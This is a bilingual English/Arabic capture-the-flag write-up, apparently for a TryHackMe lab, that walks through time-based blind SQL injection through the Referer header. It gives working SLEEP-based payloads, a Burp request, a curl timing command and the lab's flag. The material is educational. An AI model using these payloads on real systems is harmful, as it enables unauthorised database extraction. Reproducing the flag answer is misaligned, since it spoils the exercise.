# Task 08: Blind SQLi - Time Based (الحقن الأعمى القائم على التأخير الزمني)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
Time-based Blind SQL Injection represents the most stealthy and subtle form of database exploitation. It occurs when an application provides **no visual indication whatsoever** of query success or failure:
- The page content remains completely identical whether a condition is true or false.
- HTTP status codes and response headers do not change.

To confirm and exploit this vulnerability, the tester forces the database engine to pause execution using operational delay functions:
- **MySQL / MariaDB:** `SLEEP(seconds)`
- **MSSQL:** `WAITFOR DELAY '0:0:seconds'`
- **PostgreSQL:** `pg_sleep(seconds)`
- **SQLite:** Heavy computational functions or recursive queries (e.g., `randomblob()`).

If the server response is delayed by the exact sleep interval specified, the condition is confirmed as **TRUE**. If the server responds immediately without delay, the condition is **FALSE**.

#### Hands-On Exploitation: Level Four
In Level Four, user tracking occurs via HTTP headers (such as the `Referer` header) which is logged unsanitized into a database.

#### Step-by-Step Delay-Based Discovery:
1. **Test Column Count via Delay Injection:**
   ```text
   admin123' UNION SELECT SLEEP(5);--          --> Immediate Response (0s - Syntax error)
   admin123' UNION SELECT SLEEP(5),2;--        --> Delayed Response (5s! 2 columns confirmed!)
   ```
2. **Conditional Time Exfiltration:**
   Ask the database conditional delay questions:
   ```sql
   admin123' UNION SELECT IF(database() LIKE 's%', SLEEP(5), 0), 2;--
   ```
   If the database pauses for 5 seconds, the first character is 's'.
3. **Execute the Attack & Extract the Master Flag:**
   Automate time-based verification to complete level four and extract the final master flag.

#### الأسئلة المطروحة (Questions):
1. What is the final flag after completing level four? (ما هي الراية النهائية بعد إكمال المستوى الرابع؟)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **تحديات اختبار الحقن المعتمد على الوقت (Timing Jitter & Network Latency):**
  * في شبكات الإنترنت الحقيقية، قد تتسبب تقلبات الشبكة (Network Latency) في تأخير زمني طبيعي يوهم المختبر بأن الشرط محقق (False Positive).
  * **الحل التكتيكي:**
    1. قياس زمن الاستجابة الطبيعي للهدف (Baseline Latency) عدة مرات (مثلاً: 120ms).
    2. اختيار فترة تأخير ملحوظة تتجاوز ضجيج الشبكة (مثل 3 أو 5 ثوانٍ: `SLEEP(5)`).
    3. التحقق المزدوج: إذا كان الشرط ينام 5 ثوانٍ، يجب التأكد من أن الشرط المعاكس يعود فوراً في أقل من 200ms.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * راقب زمن الاستجابة في أسفل نافذة Burp Repeater أو عبر أداة Request Timer.
2. **التلميح الثاني (المستوى العملي):**
   * تأكد من أن الاستعلام يحتوي على عمودين لتطابق جملة الاتحاد: `UNION SELECT SLEEP(5),2;--`.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * الراية النهائية الخاصة بإتقان المستوى الرابع هي: `THM{SQL_INJECTION_MASTER}`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### المخطط الزمني للحقن المعتمد على التأخير:
```text
Timeline (Seconds): 0s       1s       2s       3s       4s       5s
                    ├───┼────┼────┼────┼────┤
Request (Condition FALSE) ──▶ [Responds in 0.1s]
Request (Condition TRUE)  ──────────────────────────────────────────▶ [Responds in 5.2s (SLEEP Triggered)]
```

#### الطلب البروتوكولي في Burp Suite:
```http
GET / HTTP/1.1
Host: website.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Referer: admin123' UNION SELECT SLEEP(5),2;--
Connection: close
```
*زمن استجابة الخادم:* `5,124 millis` (تأكيد قاطع للثغرة بنسبة 100%).

#### استخراج الراية النهائية عبر سطر الأوامر (cURL Time Measurement):
```bash
# قياس زمن التنفيذ بالأجزاء من الثانية
time curl -s -H "Referer: admin123' UNION SELECT SLEEP(5),2;--" "https://website.thm/"
# real    0m5.215s
```

---

### المرحلة هـ: الإجابة النهائية والقيم المستخرجة (Final Answer & Key Values)
* **قيمة الراية المستخرجة (Extracted Flag):**
  `THM{SQL_INJECTION_MASTER}`

---

### المرحلة و: التحقق العملي وإثبات الأثر (Practical Verification & Proof of Work)
* تم تأكيد تشغيل دالة التأخير واستخراج الراية واعتمادها بنجاح 100% في منصة TryHackMe:
  `THM{SQL_INJECTION_MASTER}`.

---

### المرحلة ز: الخاتمة والدرس المستفاد (Key Educational Takeaway)
* هجمات Time-Based SQLi هي الملاذ الأخير لمختبر الاختراق عند غياب أي استجابات مرئية أو منطقية، حيث يتم استغلال زمن المعالجة الفيزيائي للسيرفر كقناة اتصال سرية لاستخراج البيانات.
